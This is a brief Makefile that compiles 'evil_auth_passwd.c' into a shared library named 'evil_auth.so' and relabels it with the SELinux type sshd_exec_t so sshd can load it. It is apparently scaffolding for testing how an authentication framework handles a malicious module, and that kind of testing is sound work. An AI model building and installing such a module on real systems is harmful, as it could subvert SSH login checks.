.PHONY: all clean

all: evil

evil: evil_auth_passwd.c
	gcc -fPIC -shared -g -o evil_auth.so -I../../src/ evil_auth_passwd.c
	chcon -u system_u -r object_r -t sshd_exec_t evil_auth.so

clean:
	rm evil_auth.so
